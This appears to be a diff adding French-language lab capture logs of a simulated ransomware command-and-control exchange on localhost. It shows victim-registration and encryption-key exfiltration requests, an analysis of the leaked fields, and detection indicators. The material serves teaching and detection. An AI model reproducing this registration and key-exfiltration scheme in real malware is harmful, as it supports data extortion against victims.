@@ -1,0 +1,122 @@
+# Logs de Capture Réseau - Ransomware C2
+
+## Informations de Capture
+- Date: 2024-12-17 14:23:45
+- Interface: lo (localhost)
+- Filtre: port 5000
+- Durée: 2.3 secondes
+
+---
+
+## Requête 1 : Enregistrement de la victime
+
+```
+POST /api/register HTTP/1.1
+Host: localhost:5000
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Type: application/json
+Content-Length: 98
+
+{"victim_id": "VICTIM_student-vm_1734444225", "hostname": "student-vm", "timestamp": 1734444225}
+```
+
+**Réponse du serveur :**
+```
+HTTP/1.1 200 OK
+Server: Werkzeug/2.3.0 Python/3.10.12
+Date: Tue, 17 Dec 2024 14:23:45 GMT
+Content-Type: application/json
+Content-Length: 62
+
+{"status": "success", "message": "Victim registered", "id": 1}
+```
+
+---
+
+## Requête 2 : Exfiltration de la clé
+
+```
+POST /api/key HTTP/1.1
+Host: localhost:5000
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Type: application/json
+Content-Length: 78
+
+{"victim_id": "VICTIM_student-vm_1734444225", "key": "Sup3rS3cr3tK3y2024!"}
+```
+
+**Réponse du serveur :**
+```
+HTTP/1.1 200 OK
+Server: Werkzeug/2.3.0 Python/3.10.12
+Date: Tue, 17 Dec 2024 14:23:45 GMT
+Content-Type: application/json
+Content-Length: 58
+
+{"status": "success", "message": "Key stored", "key_id": 1}
+```
+
+---
+
+## Analyse des Données Exfiltrées
+
+### Victim ID
+- Format: `VICTIM_<hostname>_<timestamp>`
+- Exemple: `VICTIM_student-vm_1734444225`
+- Permet de tracer chaque victime unique
+
+### Hostname
+- Nom de la machine infectée: `student-vm`
+- Permet à l'attaquant de connaître l'environnement
+
+### Timestamp
+- Horodatage de l'infection: `1734444225` (Unix timestamp)
+- Correspond à: Tue Dec 17 14:23:45 2024
+
+### Encryption Key
+- Clé de chiffrement complète: `Sup3rS3cr3tK3y2024!`
+- Longueur: 19 caractères
+- **⚠️ CRITIQUE**: Envoyée en clair sur le réseau !
+
+---
+
+## Statistiques
+
+- Nombre total de requêtes: 2
+- Données envoyées: 176 bytes
+- Données reçues: 120 bytes
+- Protocol: HTTP (non chiffré)
+- Port utilisé: 5000
+
+---
+
+## Indicateurs de Détection
+
+### Patterns HTTP
+- POST vers `/api/register`
+- POST vers `/api/key`
+- Content-Type: `application/json`
+- User-Agent: `curl/7.x.x`
+
+### Patterns JSON
+- Champ `victim_id` avec préfixe `VICTIM_`
+- Champ `key` avec valeur alphanumérique
+- Champ `hostname`
+- Champ `timestamp`
+
+### Comportement Réseau
+- 2 requêtes POST successives
+- Délai < 1 seconde entre les requêtes
+- Vers le même serveur/port
+- Pas de trafic HTTPS
+
+---
+
+## Notes
+
+⚠️ Cette communication n'est PAS chiffrée. Un administrateur réseau ou un IDS peut facilement :
+1. Capturer le trafic avec Wireshark/tcpdump
+2. Extraire la clé de chiffrement
+3. Déchiffrer les fichiers sans payer la rançon !
